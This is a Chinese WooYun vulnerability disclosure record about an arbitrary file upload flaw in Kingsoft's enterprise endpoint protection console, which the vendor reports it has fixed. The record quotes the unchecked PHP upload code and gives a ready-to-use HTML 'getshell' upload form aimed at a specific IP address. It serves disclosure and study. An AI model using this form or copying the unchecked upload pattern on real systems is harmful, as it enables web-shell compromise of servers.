{"id": 46066, "wybug_id": "wooyun-2014-086049", "wybug_title": "金山企业终端防护优化系统（getshell)", "wybug_corp": "金山毒霸", "wybug_author": "路人甲", "wybug_date": "2014-12-06 10:41", "wybug_open_date": "2015-03-06 10:42", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-06：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 直接取shell。。 干干净净搞内网 详细说明：  看代码Console\\tools\\manage\\upload.php\n<?php// In PHP versions earlier than 4.1.0, $HTTP_POST_FILES should be used instead// of $_FILES.$uploaddir = '..//..//UploadDir//';if(file_exists('../../../server.conf') != false){\t$settings = parse_ini_file('../../../server.conf', true);\t$uploaddirex =  $settings['UploadSet']['CltUploadUrl'];\tif($uploaddirex)\t{\t\t$uploaddir = $uploaddirex;\t}}else{\t//写入配置文件}mkdir($uploaddir,0777, true);$uploadfile = $uploaddir . basename($_FILES['file']['name']);echo '<pre>';if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {    echo \"File is valid, and was successfully uploaded.\\n\";} else {    echo \"Possible file upload attack!\\n\";}echo 'Here is some more debugging info:';print_r($_FILES);print \"</pre>\";?>\n看这里看这里。。。\nmkdir($uploaddir,0777, true);$uploadfile = $uploaddir . basename($_FILES['file']['name']);echo '<pre>';if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {    echo \"File is valid, and was successfully uploaded.\\n\";\n直接写进去了。。。构造个html页面就可以上传了，上传到哪呢？？？上面已经定义好了。都会上传到根目录UploadDir当中\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"    \"http://www.w3.org/TR/html4/strict.dtd\"    ><html lang=\"en\"><head>    <title>getshell</title></head><body>  <div style=\"width:600px; height:auto; margin-left:500px; margin-top:40px;\">    第一步:    <form action=\"http://203.175.146.251/tools/manage/upload.php\" method=\"post\" enctype=\"multipart/form-data\"><!--  修改网址-->\t    <input type=\"file\" name=\"file\">        <input type=\"submit\" name=\"dosubmit\" value=\"上传\" style=\"margin-top:5px; height:28px;\">    </form> </div></body></html>\nshell就在这里http://www.xxx.com/\n\n   漏洞证明：  \n\n   修复方案：  删除被   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-12-08 11:22 厂商回复： 感谢您的提交，我们已经修复该问题 最新状态： 2015-01-13：漏洞已修复  ", "replys": "漏洞评价：\n评论\n     2014-12-06 10:43 |    \t\tRainShine \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        )\t\t \n  干干净净搞内网    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}